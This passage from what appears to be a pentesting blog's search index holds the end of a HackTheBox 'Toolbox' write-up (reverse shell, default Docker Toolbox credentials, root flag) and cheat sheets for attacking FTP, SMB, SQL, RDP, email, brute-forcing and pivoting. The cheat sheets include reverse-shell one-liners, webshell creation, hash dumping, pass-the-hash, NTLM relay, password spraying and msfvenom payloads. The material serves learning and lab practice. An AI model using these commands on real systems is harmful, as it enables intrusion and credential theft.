have to use <code>sqlmap</code> with the <code>--force-ssl</code> argument as follows:</p> <p></p> <p>As we can see from the screenshot, the <code>username</code> parameter is vulnerable. We can obtain code execution as follows:</p> <p></p> <p>After starting our listener, we execute a bash reverse shell to obtain a foothold.</p> <pre><code>\u2514\u2500$ nc -lvnp 1337                                                                          \nNcat: Version 7.92 ( https://nmap.org/ncat )                                               \nNcat: Listening on :::1337                                                                 \nNcat: Listening on 0.0.0.0:1337                                                            \nNcat: Connection from 10.129.96.171.                                                       \nNcat: Connection from 10.129.96.171:53999.                                                 \nbash: cannot set terminal process group (1127): Inappropriate ioctl for device                                                                                                         \nbash: no job control in this shell                                                         \npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$\n</code></pre> <p>We receive a shell in the context of the <code>postgres</code> user. The user flag can be found in <code>/var/lib/postgresql</code>.</p> <pre><code>postgres@bc56e3cc55e9:/home/tony$ cd /var/lib/postgresql                                   \ncd /var/lib/postgresql                                                                                                                                                                 \npostgres@bc56e3cc55e9:/var/lib/postgresql$ ls                                                                                                                                          \nls                                                                                         \n11                                                                                         \nuser.txt                                                                                   \npostgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt                                    \ncat user.txt                                                                               \n&lt;redacted&gt;  flag.txt\n</code></pre>","title":"EnumerationFTPHTTPS"},{"location":"blog/2022/09/15/hackthebox-toolbox/#privilege-escalation","text":"<p>For the privilege escalation part, we'll have to refer to the Docker Toolbox Documentation which can be found here. In short, Docker Toolbox uses Boot2Docker for running a VM which runs all containers. The Docker host can be found at the gateway IP.</p> <pre><code>postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig                                                                                                                            \nifconfig                                                                                   \neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500                                 \n        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255                     \n        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)                                  \n        RX packets 170164  bytes 22343857 (21.3 MiB)                                       \n        RX errors 0  dropped 0  overruns 0  frame 0                                        \n        TX packets 93017  bytes 38447922 (36.6 MiB)                                        \n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>As we can see, the container ip is 172.17.0.2, the gateway is located at 172.17.0.1. Looking at the Documentation again, default credentials are <code>docker:tcuser</code>.</p> <p>We'll have to upgrade our shell to an interactive one, e.g. via python, otherwise it will fail, as seen below.</p> <pre><code>postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1                                              \nPseudo-terminal will not be allocated because stdin is not a terminal.                                                \nPermission denied, please try again.                       \nPermission denied, please try again.                       \ndocker@172.17.0.1: Permission denied (publickey,password,keyboard-interactive).                                       \npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'                                                                                                                                          \n&lt;in$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'                                                                  \npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1                                              \nssh docker@172.17.0.1                                      \ndocker@172.17.0.1's password: tcuser                       \n\n   ( '&gt;')                                                  \n  /) TC (\\   Core is distributed with ABSOLUTELY NO WARRANTY.                                                         \n (/-_--_-\\)           www.tinycorelinux.net                \n\ndocker@box:~$\n</code></pre> <p>We are able to login to the Docker VM. Looking at the FAQ, Docker-Toolbox has access to <code>C:\\Users</code> folder, which is located at <code>/c/Users</code></p> <pre><code>docker@box:~$ cd /c/Users                                                                                             \ncd /c/Users                                                                                                           \ndocker@box:/c/Users$ ls                                                                                               \nls                                                                                                                    \nAdministrator  Default        Public         desktop.ini                                                                                                                                                                                    \nAll Users      Default User   Tony \n</code></pre> <p>From here on, we can just browse to the <code>Administrator</code> folder and grab the root flag.</p> <pre><code>docker@box:/c/Users/Administrator$ cd Desktop                                                                         \ncd Desktop                                                 \ndocker@box:/c/Users/Administrator/Desktop$ ls                                                                         \nls                                                                                                                    \ndesktop.ini  root.txt                                                                                                 \ndocker@box:/c/Users/Administrator/Desktop$ cat root.txt                                                               \ncat root.txt                                                                                                          \n&lt;redacted&gt;\n</code></pre> <p>This box was another good example that it is always useful to refer to documentation when looking for ways to abuse weak authentication, misconfigurations and so on.</p>","title":"Privilege Escalation"},{"location":"cheat_sheets/attacking_common_services/","text":"Attacking FTP    Command Description     <code>ftp 192.168.2.142</code> Connecting to the FTP server using the <code>ftp</code> client.   <code>nc -v 192.168.2.142 21</code> Connecting to the FTP server using <code>netcat</code>.   <code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code> Brute-forcing the FTP service.     Attacking SMB    Command Description     <code>smbclient -N -L //10.129.14.128</code> Null-session testing against the SMB service.   <code>smbmap -H 10.129.14.128</code> Network share enumeration using <code>smbmap</code>.   <code>smbmap -H 10.129.14.128 -r notes</code> Recursive network share enumeration using <code>smbmap</code>.   <code>smbmap -H 10.129.14.128 --download \"notes\\note.txt\"</code> Download a specific file from the shared folder.   <code>smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"</code> Upload a specific file to the shared folder.   <code>rpcclient -U'%' 10.10.110.17</code> Null-session with the <code>rpcclient</code>.   <code>./enum4linux-ng.py 10.10.11.45 -A -C</code> Automated enumeratition of the SMB service using <code>enum4linux-ng</code>.   <code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code> Password spraying against different users from a list.   <code>impacket-psexec administrator:'Password123!'@10.10.110.17</code> Connect to the SMB service using the <code>impacket-psexec</code>.   <code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code> Execute a command over the SMB service using <code>crackmapexec</code>.   <code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code> Enumerating Logged-on users.   <code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code> Extract hashes from the SAM database.   <code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code> Use the Pass-The-Hash technique to authenticate on the target host.   <code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code> Dump the SAM database using <code>impacket-ntlmrelayx</code>.   <code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;base64 reverse shell&gt;</code> Execute a PowerShell based reverse shell using <code>impacket-ntlmrelayx</code>.     Attacking SQL Databases    Command Description     <code>mysql -u julio -pPassword123 -h 10.129.20.13</code> Connecting to the MySQL server.   <code>sqlcmd -S SRVMSSQL\\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30</code> Connecting to the MSSQL server.   <code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code> Connecting to the MSSQL server from Linux.   <code>sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h</code> Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.   <code>mysql&gt; SHOW DATABASES;</code> Show all available databases in MySQL.   <code>mysql&gt; USE xyzusers;</code> Select a specific database in MySQL.   <code>mysql&gt; SHOW TABLES;</code> Show all available tables in the selected database in MySQL.   <code>mysql&gt; SELECT * FROM users;</code> Select all available entries from the \"users\" table in MySQL.   <code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code> Show all available databases in MSSQL.   <code>sqlcmd&gt; USE xyzusers</code> Select a specific database in MSSQL.   <code>sqlcmd&gt; SELECT * FROM xyzusers.INFORMATION_SCHEMA.TABLES</code> Show all available tables in the selected database in MSSQL.   <code>sqlcmd&gt; SELECT * FROM users</code> Select all available entries from the \"users\" table in MSSQL.   <code>sqlcmd&gt; EXECUTE sp_configure 'show advanced options', 1</code> To allow advanced options to be changed.   <code>sqlcmd&gt; EXECUTE sp_configure 'xp_cmdshell', 1</code> To enable the xp_cmdshell.   <code>sqlcmd&gt; RECONFIGURE</code> To be used after each sp_configure command to apply the changes.   <code>sqlcmd&gt; xp_cmdshell 'whoami'</code> Execute a system command from MSSQL server.   <code>mysql&gt; SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php'</code> Create a file using MySQL.   <code>mysql&gt; show variables like \"secure_file_priv\";</code> Check if the the secure file privileges are empty to read locally stored files on the system.   <code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code> Read local files in MSSQL.   <code>mysql&gt; select LOAD_FILE(\"/etc/passwd\");</code> Read local files in MySQL.   <code>sqlcmd&gt; EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'</code> Hash stealing using the <code>xp_dirtree</code> command in MSSQL.   <code>sqlcmd&gt; EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'</code> Hash stealing using the <code>xp_subdirs</code> command in MSSQL.   <code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code> Identify linked servers in MSSQL.   <code>sqlcmd&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]</code> Identify the user and its privileges used for the remote connection in MSSQL.     Attacking RDP    Command Description     <code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code> Password spraying against the RDP service.   <code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code> Brute-forcing the RDP service.   <code>rdesktop -u admin -p password123 192.168.2.143</code> Connect to the RDP service using <code>rdesktop</code> in Linux.   <code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code> Impersonate a user without its password.   <code>net start sessionhijack</code> Execute the RDP session hijack.   <code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code> Enable \"Restricted Admin Mode\" on the target Windows host.   <code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code> Use the Pass-The-Hash technique to login on the target host without a password.     Attacking DNS    Command Description     <code>dig AXFR @ns1.LEGALCORP.xyz LEGALCORP.xyz</code> Perform an AXFR zone transfer attempt against a specific name server.   <code>subfinder -d LEGALCORP.com -v</code> Brute-forcing subdomains.   <code>host support.LEGALCORP.com</code> DNS lookup for the specified subdomain.     Attacking Email Services    Command Description     <code>host -t MX microsoft.com</code> DNS lookup for mail servers for the specified domain.   <code>dig mx LEGALCORP.com \\| grep \"MX\" \\| grep -v \";\"</code> DNS lookup for mail servers for the specified domain.   <code>host -t A mail1.LEGALCORP.xyz.</code> DNS lookup of the IPv4 address for the specified subdomain.   <code>telnet 10.10.110.20 25</code> Connect to the SMTP server.   <code>smtp-user-enum -M RCPT -U userlist.txt -D LEGALCORP.xyz -t 10.129.203.7</code> SMTP user enumeration using the RCPT command against the specified host.   <code>python3 o365spray.py --validate --domain msplaintext.xyz</code> Verify the usage of Office365 for the specified domain.   <code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code> Enumerate existing users using Office365 on the specified domain.   <code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code> Password spraying against a list of users that use Office365 for the specified domain.   <code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code> Brute-forcing the POP3 service.   <code>swaks --from notifications@LEGALCORP.com --to employees@LEGALCORP.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213</code> Testing the SMTP service for the open-relay vulnerability.","title":"Attacking Common Services"},{"location":"cheat_sheets/brute_forcing/","text":"Command Description     <code>hydra -h</code> hydra help   <code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - Combined Wordlist   <code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - User/Pass Wordlists   <code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'\"</code> Login Form Brute Force - Static User, Pass Wordlist   <code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code> SSH Brute Force - User/Pass Wordlists   <code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code> FTP Brute Force - Static User, Pass Wordlist","title":"Hydra"},{"location":"cheat_sheets/brute_forcing/#wordlists","text":"Command Description     <code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code> Default Passwords Wordlist   <code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code> Common Passwords Wordlist   <code>/opt/useful/SecLists/Usernames/Names/names.txt</code> Common Names Wordlist","title":"Wordlists"},{"location":"cheat_sheets/brute_forcing/#misc","text":"Command Description     <code>cupp -i</code> Creating Custom Password Wordlist   <code>sed -ri '/^.{,7}$/d' william.txt</code> Remove Passwords Shorter Than 8   <code>sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt</code> Remove Passwords With No Special Chars   <code>sed -ri '/[0-9]+/!d' william.txt</code> Remove Passwords With No Numbers   <code>git clone https://github.com/21y4d/usernameGenerator.git</code> Download usernameGenerator   <code>bash usernameGenerator/usernameGenerator.sh &lt;First Name&gt; &lt;Last Name&gt;</code> usernameGenerator Usage   <code>ssh b.gates@SERVER_IP -p PORT</code> SSH to Server   <code>ftp 127.0.0.1</code> FTP to Server   <code>su - user</code> Switch to User","title":"Misc"},{"location":"cheat_sheets/cheatsheet-77/","text":"","title":"Commands"},{"location":"cheat_sheets/cheatsheet-77/#basic-tools","text":"Command Description     General    <code>sudo openvpn user.ovpn</code> Connect to VPN   <code>ifconfig</code>/<code>ip a</code> Show our IP address   <code>netstat -rn</code> Show networks accessible via the VPN   <code>ssh user@10.10.10.10</code> SSH to a remote server   <code>ftp 10.129.42.253</code> FTP to a remote server   tmux    <code>tmux</code> Start tmux   <code>ctrl+b ctrl+c</code> tmux: new window   <code>ctrl+b 1</code> tmux: switch to window (<code>1</code>)   <code>ctrl+%</code> tmux: split pane vertically   <code>ctrl+\"</code> tmux: split pane horizontally   <code>ctrl+-&gt;</code> tmux: switch to the right pane   <code>ctrl+b + :</code> tmux: switch to scroll mode   <code>setw -g mouse on</code> tmux: enable mousewheel scrolling   Vim    <code>vim file</code> vim: open <code>file</code> with vim   <code>esc+i</code> vim: enter <code>insert</code> mode   <code>esc</code> vim: back to <code>normal</code> mode   <code>x</code> vim: Cut character   <code>dw</code> vim: Cut word   <code>dd</code> vim: Cut full line   <code>yw</code> vim: Copy word   <code>yy</code> vim: Copy full line   <code>p</code> vim: Paste   <code>:1</code> vim: Go to line number 1.   <code>:w</code> vim: Write the file 'i.e. save'   <code>:q</code> vim: Quit   <code>:q!</code> vim: Quit without saving   <code>:wq</code> vim: Write and quit","title":"Basic Tools"},{"location":"cheat_sheets/cheatsheet-77/#pentesting","text":"Command Description     Service Scanning    <code>nmap 10.129.42.253</code> Run nmap on an IP   <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP   <code>locate scripts/citrix</code> List various available nmap scripts   <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP   <code>netcat 10.10.10.10 22</code> Grab banner of an open port   <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares   <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share   <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP   <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string   Web Enumeration    <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website   <code>gobuster dns -d LEGALCORP.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website   <code>curl -IL https://www.LEGALCORP.com</code> Grab website banner   <code>whatweb 10.10.10.121</code> List details about the webserver/certificates   <code>curl 10.10.10.121/robots.txt</code> List potential directories in <code>robots.txt</code>   <code>ctrl+U</code> View page source (in Firefox)   Public Exploits    <code>searchsploit openssh 7.2</code> Search for public exploits for a web application   <code>msfconsole</code> MSF: Start the Metasploit Framework   <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF   <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module   <code>show options</code> MSF: Show required options for an MSF module   <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option   <code>check</code> MSF: Test if the target server is vulnerable   <code>exploit</code> MSF: Run the exploit on the target server is vulnerable   Using Shells    <code>nc -lvnp 1234</code> Start a <code>nc</code> listener on a local port   <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server   <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server   <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server   <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server   <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1)   <code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2)   <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file   <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell   Privilege Escalation    <code>./linpeas.sh</code> Run <code>linpeas</code> script to enumerate remote server   <code>sudo -l</code> List available <code>sudo</code> privileges   <code>sudo -u user /bin/echo Hello World!</code> Run a command with <code>sudo</code>   <code>sudo su -</code> Switch to root user (if we have access to <code>sudo su</code>)   <code>sudo su user -</code> Switch to a user (if we have access to <code>sudo su</code>)   <code>ssh-keygen -f key</code> Create a new SSH key   <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user   <code>ssh root@10.10.10.10 -i key</code> SSH to the server with the generated private key   Transferring Files    <code>python3 -m http.server 8000</code> Start a local webserver   <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine   <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine   <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with <code>scp</code> (requires SSH access)   <code>base64 shell -w 0</code> Convert a file to <code>base64</code>   <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from <code>base64</code> back to its orig   <code>md5sum shell</code> Check the file's <code>md5sum</code> to ensure it converted correctly","title":"Pentesting"},{"location":"cheat_sheets/cheatsheet-77/#linux","text":"Command Description      <code>man &lt;tool&gt;</code> Opens man pages for the specified tool.   <code>&lt;tool&gt; -h</code> Prints the help page of the tool.   <code>apropos &lt;keyword&gt;</code> Searches through man pages' descriptions for instances of a given keyword.   <code>cat</code> Concatenate and print files.   <code>whoami</code> Displays current username.   <code>id</code> Returns users identity.   <code>hostname</code> Sets or prints the name of the current host system.   <code>uname</code> Prints operating system name.   <code>pwd</code> Returns working directory name.   <code>ifconfig</code> The <code>ifconfig</code> utility is used to assign or view an address to a network interface and/or configure network interface parameters.   <code>ip</code> Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.   <code>netstat</code> Shows network status.   <code>ss</code> Another utility to investigate sockets.   <code>ps</code> Shows process status.   <code>who</code> Displays who is logged in.   <code>env</code> Prints environment or sets and executes a command.   <code>lsblk</code> Lists block devices.   <code>lsusb</code> Lists USB devices.   <code>lsof</code> Lists opened files.   <code>lspci</code> Lists PCI devices.   <code>sudo</code> Execute command as a different user.   <code>su</code> The <code>su</code> utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.   <code>useradd</code> Creates a new user or update default new user information.   <code>userdel</code> Deletes a user account and related files.   <code>usermod</code> Modifies a user account.   <code>addgroup</code> Adds a group to the system.   <code>delgroup</code> Removes a group from the system.   <code>passwd</code> Changes user password.   <code>dpkg</code> Install, remove and configure Debian-based packages.   <code>apt</code> High-level package management command-line utility.   <code>aptitude</code> Alternative to <code>apt</code>.   <code>snap</code> Install, remove and configure snap packages.   <code>gem</code> Standard package manager for Ruby.   <code>pip</code> Standard package manager for Python.   <code>git</code> Revision control system command-line utility.   <code>systemctl</code> Command-line based service and systemd control manager.   <code>ps</code> Prints a snapshot of the current processes.   <code>journalctl</code> Query the systemd journal.   <code>kill</code> Sends a signal to a process.   <code>bg</code> Puts a process into background.   <code>jobs</code> Lists all processes that are running in the background.   <code>fg</code> Puts a process into the foreground.   <code>curl</code> Command-line utility to transfer data from or to a server.   <code>wget</code> An alternative to <code>curl</code> that downloads files from FTP or HTTP(s) server.   <code>python3 -m http.server</code> Starts a Python3 web server on TCP port 8000.   <code>ls</code> Lists directory contents.   <code>cd</code> Changes the directory.   <code>clear</code> Clears the terminal.   <code>touch</code> Creates an empty file.   <code>mkdir</code> Creates a directory.   <code>tree</code> Lists the contents of a directory recursively.   <code>mv</code> Move or rename files or directories.   <code>cp</code> Copy files or directories.   <code>nano</code> Terminal based text editor.   <code>which</code> Returns the path to a file or link.   <code>find</code> Searches for files in a directory hierarchy.   <code>updatedb</code> Updates the locale database for existing contents on the system.   <code>locate</code> Uses the locale database to find contents on the system.   <code>more</code> Pager that is used to read STDOUT or files.   <code>less</code> An alternative to <code>more</code> with more features.   <code>head</code> Prints the first ten lines of STDOUT or a file.   <code>tail</code> Prints the last ten lines of STDOUT or a file.   <code>sort</code> Sorts the contents of STDOUT or a file.   <code>grep</code> Searches for specific results that contain given patterns.   <code>cut</code> Removes sections from each line of files.   <code>tr</code> Replaces certain characters.   <code>column</code> Command-line based utility that formats its input into multiple columns.   <code>awk</code> Pattern scanning and processing language.   <code>sed</code> A stream editor for filtering and transforming text.   <code>wc</code> Prints newline, word, and byte counts for a given input.   <code>chmod</code> Changes permission of a file or directory.   <code>chown</code> Changes the owner and group of a file or directory.","title":"Linux"},{"location":"cheat_sheets/cheatsheet_ptpf/","text":"Command Description     <code>ifconfig</code> Linux-based command that displays all current network configurations of a system.   <code>ipconfig</code> Windows-based command that displays all system network configurations.   <code>netstat -r</code> Command used to display the routing table for all IPv4-based protocols.   <code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code> Nmap command used to scan a target for open ports allowing SSH or MySQL connections.   <code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code> SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.   <code>netstat -antp \\| grep 1234</code> Netstat option used to display network connections associated with a tunnel created. Using <code>grep</code> to filter based on local port <code>1234</code> .   <code>nmap -v -sV -p1234 localhost</code> Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.   <code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code> SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.   <code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code> SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.   <code>tail -4 /etc/proxychains.conf</code> Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.   <code>proxychains nmap -v -sn 172.16.5.1-200</code> Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).   <code>proxychains nmap -v -Pn -sT 172.16.5.19</code> Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).   <code>proxychains msfconsole</code> Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.   <code>msf6 &gt; search rdp_scanner</code> Metasploit search that attempts to find a module called <code>rdp_scanner</code>.   <code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code> Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.   <code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code> Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.   <code>msf6 &gt; use exploit/multi/handler</code> Used to select the multi-handler exploit module in Metasploit.   <code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code> Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user's home directory (<code>:~/</code>).   <code>python3 -m http.server 8123</code> Uses Python3 to start a simple HTTP server listening on port<code>8123</code>. Can be used to retrieve files from a host.   <code>Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"</code> PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.   <code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code> SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.   <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code> Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.   <code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code> Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).       <code>for i in {1...254} ;do (ping -c 1 172.16.5.$i \\| grep \"bytes from\" &amp;) ;done</code> For Loop used on a Linux-based system to discover devices in a specified network segment.   <code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \\| find \"Reply\"</code> For Loop used on a Windows-based system to discover devices in a specified network segment.   <code>1..254 \\| % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}</code> PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.   <code>msf6 &gt; use auxiliary/server/socks_proxy</code> Metasploit command that selects the <code>socks_proxy</code> auxiliary module.   <code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code> Metasploit command that lists all currently running jobs.   <code>socks4   127.0.0.1 9050</code> Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.   <code>Socks5 127.0.0.1 1080</code> Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5  proxy is used in combination with proxychains on the specified IP address and port.   <code>msf6 &gt; use post/multi/manage/autoroute</code> Metasploit command used to select the autoroute module.       <code>meterpreter &gt; help portfwd</code> Meterpreter command used to display the features of the portfwd command.   <code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code> Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.   <code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code> Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.   <code>netstat -antp</code> Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.   <code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code> Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.   <code>meterpreter &gt; bg</code> Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux   <code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code> Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.   <code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code> Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.   <code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code> Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.   <code>sudo apt-get install sshuttle</code> Uses apt-get to install the tool sshuttle.   <code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code> Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).   <code>sudo git clone https://github.com/klsecservices/rpivot.git</code> Clones the rpivot project GitHub repository.   <code>sudo apt-get install python2.7</code> Uses apt-get to install python2.7.   <code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code> Used to 